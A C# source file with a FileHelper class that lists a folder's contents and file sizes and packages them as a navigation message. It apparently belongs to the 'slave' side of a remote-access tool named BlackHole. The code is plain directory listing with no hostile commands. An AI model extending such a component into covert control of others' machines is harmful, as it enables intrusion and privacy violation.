using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class FileHelper : Singleton<FileHelper>
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public FolderNavigationMessage NavigateToFolder(string path)
        {
            // transform relative to absolute
            path = Path.GetFullPath(path);

            var files = new List<FileMeta>()
            {
                new FileMeta()
                {
                    Type = FileType.FOLDER,
                    Name = "..",
                    Size = "0"
                }
            };
            // append directories
            files
                .AddRange(Directory
                                .GetDirectories(path)
                                .Select(name => new DirectoryInfo(name))
                                .Select(info => new FileMeta()
                                {
                                    Type = FileType.FOLDER,
                                    Name = info.Name + "\\",
                                    Size = "0"
                                }));
            // append files
            files
                .AddRange(Directory
                                .GetFiles(path)
                                .Select(name => new FileInfo(name))
                                .Select(info => new FileMeta()
                                {
                                    Type = FileType.FILE,
                                    Name = info.Name,
                                    Size = FormatFileSize(info.Length)
                                }));

            return new FolderNavigationMessage()
            {
                Path = path,
                Files = files
            };
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="length"></param>
        private string FormatFileSize(double length)
        {
            int order = 0;
            string[] sizes = { "B", "KB", "MB", "GB" };
            while (length >= 1024 && order + 1 < sizes.Length)
            {
                order++;
                length = length / 1024;
            }
            return string.Format("{0:0.##} {1}", length, sizes[order]);
        }
    }
}
